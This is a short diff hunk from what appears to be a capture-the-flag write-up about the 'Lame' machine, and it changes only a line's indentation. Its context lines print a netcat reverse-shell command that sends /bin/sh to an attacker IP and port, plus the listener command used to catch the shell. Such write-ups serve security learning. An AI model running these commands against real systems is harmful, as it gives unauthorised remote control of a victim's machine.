@@ -44,7 +44,7 @@ cmd = `/bin/nc -e /bin/sh 10.10.14.9 4445`
 Setting up a Netcat listener on our attack machine to catch the shell:
 `sudo nc -nlvp 4445`
 
-After executing nmap script, we have successfully got a Reverse shell:
+    After executing nmap script, we have successfully got a Reverse shell:
 
 ![lame rev shell](/assets/lamerevshell.png)
 
